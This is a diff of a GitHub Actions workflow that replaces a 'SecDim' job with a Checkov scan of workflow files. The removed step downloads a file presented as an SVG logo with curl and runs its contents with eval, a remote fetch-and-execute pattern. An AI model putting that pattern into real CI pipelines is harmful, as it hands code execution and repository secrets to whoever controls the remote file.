@@ -1,16 +1,19 @@
-name: SecDim
+name: Checkov Pipeline Scan
 
-on: pull_request
+on:
+  pull_request:
+    paths:
+      - ".github/workflows/**"
 
 jobs:
-  secdim:
+  checkov:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Run Hello SecDim script
-        run: |
-          CONTENTS=$(curl "https://secdim.com/assets/images/logo.svg")
-          eval $CONTENTS
+      - name: Run Checkov on GitHub Actions workflows
+        uses: bridgecrewio/checkov-action@v12
+        with:
+          directory: .
+          framework: github_actions
